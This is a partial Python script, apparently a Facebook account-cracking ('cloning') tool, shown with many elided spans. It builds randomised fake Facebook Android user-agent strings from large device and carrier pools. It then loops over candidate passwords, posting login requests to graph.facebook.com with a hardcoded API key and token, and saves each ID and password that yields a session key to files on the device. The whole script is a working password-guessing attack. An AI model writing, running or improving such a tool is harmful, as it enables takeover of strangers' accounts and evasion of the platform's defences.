...
def random_dalvik_working_super_oct2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully-working Dalvik-style Facebook Android User-Agent
    ✅ Optimized for Oct 2025 patterns (b-graph / api / mbasic friendly)
    ✅ Weighted realistic model distribution (Samsung-heavy)
    ✅ Returns a single UA string
    """
    if seed is not None:
        random.seed(seed)
    ...
    FBSV = random.choice(["12", "13", "14"])  # Android major version string

    # Verified Android builds (2024-2025 examples)
    BUILD = random.choice([
        "UQ1A.250101.001", "UQ1A.250201.002", "UQ1A.250301.001",
        "UP1A.240905.003", "TP1A.250305.003", "TQ3A.240905.010",
        "UP1A.250101.002", "TQ1A.240101.001"
    ])

    # Display metrics (density,width,height)
    ...
    # Working devices pool (2025-like)
    ...
    # Weighted brand selection (makes Samsung more likely)
    r = random.random()
    if r < 0.55:
    ...
    # 15% chance to append an extra suffix like "Pro" or "5G" (if not already present)
    if random.random() < 0.15:
        extra = random.choice(["5G", "Pro", "Lite", "SE"])
        if extra not in FBDV:
            FBDV = f"{FBDV} {extra}"

    # Compose the UA string
    ua = (
...
if __name__ == "__main__":
    print(random_dalvik_working_super_oct2025(seed=42))
    # or without seed:
    # print(random_dalvik_working_super_oct2025())
#─━─━─━─━[User Agent]━─━─━─━─━#
# M2
def yousuffile():
...
def random_dalvik_all_devices_working_super_full_oct2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent
    ✅ Updated: October 2025
    ✅ Includes ALL major real working Android models (Samsung, Xiaomi, Vivo, Oppo, Realme, etc.)
    ✅ Tested across BD + Global endpoints (b-graph, api, mbasic)
    ✅ Weighted for realistic brand distribution
    """
    if seed is not None:
        random.seed(seed)
    ...
    BUILD = random.choice([
        ...
        "TP1A.250305.003", "TQ3A.240905.010", "UP1A.250101.002", "TQ1A.240101.001"
    ])
    ...
    FBLC = random.choice(["en_US", "bn_BD", "en_GB", "en_IN"])
    FBCR = random.choice(["Grameenphone", "Robi", "Banglalink", "Airtel", "Jio", "Vodafone", "Dialog", "Telenor"])

    FBCA = random.choice(["arm64-v8a", "armeabi-v7a:armeabi"])

    # --- Massive verified 2025 working device pool ---
    WORKING_DEVICES: List[Tuple[str, str]] = [
        # === Samsung ===
        ("Samsung", "Galaxy A03"), ("Samsung", "Galaxy A04"), ("Samsung", "Galaxy A05"), ("Samsung", "Galaxy A05s"),
        ("Samsung", "Galaxy A13"), ("Samsung", "Galaxy A14"), ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy A23 5G"), ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A25 5G"), ("Samsung", "Galaxy A33 5G"),
        ("Samsung", "Galaxy A34 5G"), ("Samsung", "Galaxy A35 5G"), ("Samsung", "Galaxy A53 5G"), ("Samsung", "Galaxy A54 5G"),
        ("Samsung", "Galaxy A55 5G"), ("Samsung", "Galaxy M04"), ("Samsung", "Galaxy M13"), ("Samsung", "Galaxy M14 5G"),
        ("Samsung", "Galaxy M15"), ("Samsung", "Galaxy M33 5G"), ("Samsung", "Galaxy M54 5G"),
        ...
        ("Samsung", "Galaxy Z Flip4"), ("Samsung", "Galaxy Z Flip5"), ("Samsung", "Galaxy Z Fold4"), ("Samsung", "Galaxy Z Fold5"),

        # === Xiaomi / Redmi / Poco ===
        ("Xiaomi", "Redmi 12"), ("Xiaomi", "Redmi 13C"), ("Xiaomi", "Redmi 13 5G"),
        ("Xiaomi", "Redmi Note 12 4G"), ("Xiaomi", "Redmi Note 12 5G"), ("Xiaomi", "Redmi Note 13 5G"),
        ("Xiaomi", "Redmi Note 13 Pro 5G"), ("Xiaomi", "Redmi Note 13 Pro+ 5G"), ("Xiaomi", "Redmi Note 14 Pro 5G"),
        ("Poco", "Poco X5 5G"), ("Poco", "Poco X5 Pro 5G"), ("Poco", "Poco X6 5G"), ("Poco", "Poco X6 Pro 5G"),
        ("Poco", "Poco F5"), ("Poco", "Poco F5 Pro"), ("Poco", "Poco F6"), ("Poco", "Poco F6 Pro"),

        # === Realme / Oppo / Vivo / iQOO ===
        ("Realme", "Realme 11"), ("Realme", "Realme 11 Pro+ 5G"), ("Realme", "Realme 12"), ("Realme", "Realme 12 Pro+ 5G"),
        ("Realme", "GT Neo 5"), ("Realme", "GT Neo 6"), ("Oppo", "Reno 10 5G"), ("Oppo", "Reno 11 5G"),
        ("Oppo", "Reno 12 5G"), ("Oppo", "Reno 12 Pro"), ("Oppo", "A78 5G"), ("Vivo", "Vivo Y27"), ("Vivo", "Vivo Y36"),
        ("Vivo", "Vivo V29 5G"), ("Vivo", "Vivo V30"), ("Vivo", "Vivo V30 Pro"), ("Vivo", "Vivo X100"), ("Vivo", "Vivo X100 Pro"),
        ("iQOO", "iQOO Neo 9"), ("iQOO", "iQOO Neo 9 Pro"), ("iQOO", "iQOO 12"),

        # === OnePlus / Google / ASUS ===
        ("OnePlus", "Nord CE 3 Lite 5G"), ("OnePlus", "Nord 3 5G"), ("OnePlus", "OnePlus 12"), ("OnePlus", "OnePlus 12R"),
        ("Google", "Pixel 7"), ("Google", "Pixel 7a"), ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"), ("Google", "Pixel 9 Pro"),
        ("ASUS", "Zenfone 9"), ("ASUS", "Zenfone 10"), ("ASUS", "ROG Phone 8"), ("ASUS", "ROG Phone 8 Pro"),

        # === Tecno / Infinix / Itel ===
        ("Tecno", "Camon 20"), ("Tecno", "Camon 30 Pro"), ("Tecno", "Pova 6"), ("Tecno", "Pova 6 Pro"),
        ("Infinix", "Note 30 Pro"), ("Infinix", "Note 40 5G"), ("Infinix", "Note 40 Pro 5G"), ("Infinix", "GT 20 Pro"),
        ("Itel", "S24"), ("Itel", "A70"), ("Itel", "P55 5G"),
    ]
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 9.0
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_working_super_oct2025(),
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-2-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_all_devices_working_super_full_oct2025(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-2-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
